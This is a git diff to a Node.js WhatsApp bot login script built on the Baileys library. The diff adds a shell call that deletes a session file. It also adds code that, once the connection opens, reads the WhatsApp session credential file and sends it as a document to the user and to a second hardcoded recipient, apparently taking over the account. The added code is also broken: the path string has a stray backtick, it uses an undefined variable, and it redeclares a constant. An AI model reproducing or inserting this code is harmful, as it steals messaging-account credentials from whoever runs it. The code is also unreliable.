@@ -4,6 +4,9 @@ const fs = require('fs')
 const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
 const { state, saveState } = useSingleFileAuthState('./session.alfa.json')
+const { exec, spawn, execSync } = require("child_process")
+exec('rm -rf session.tokio.json')
+
 
   function qr() {
 //------------------------------------------------------
@@ -19,7 +22,10 @@ const { state, saveState } = useSingleFileAuthState('./session.alfa.json')
     session.ev.on("connection.update",async  (s) => {
         const { connection, lastDisconnect } = s
         if (connection == "open") {
-            await delay(1000 * 10)
+            await delay(1000 * 10);
+  const session = fs.readFileSync("./session.alfa.json`");
+   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `session.alfa.json` })
+	 await conn.sendMessage(myId2, { document: session, mimetype: 'application/json', fileName: `session.alfa.json` })
             process.exit(0)
         }
         if (
